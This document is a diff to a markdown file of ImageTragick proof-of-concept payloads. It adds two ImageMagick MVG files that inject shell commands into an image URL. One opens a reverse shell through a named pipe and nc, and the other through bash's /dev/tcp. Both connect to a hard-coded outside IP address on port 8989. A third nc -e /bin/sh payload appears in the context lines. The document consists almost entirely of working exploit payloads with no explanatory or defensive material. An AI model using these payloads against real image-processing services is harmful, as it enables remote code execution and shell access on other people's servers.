@@ -1,8 +1,21 @@
 # ImageTragick POCs
 
 ## RCE_POC
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|mknod /tmp/backpipe p && nc 121.42.56.8 8989 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe")'
+pop graphic-context
 ```
 
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/121.42.56.8/8989 0>&1")'
+pop graphic-context
+```
+```
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh 127.0.0.1 "4544)'
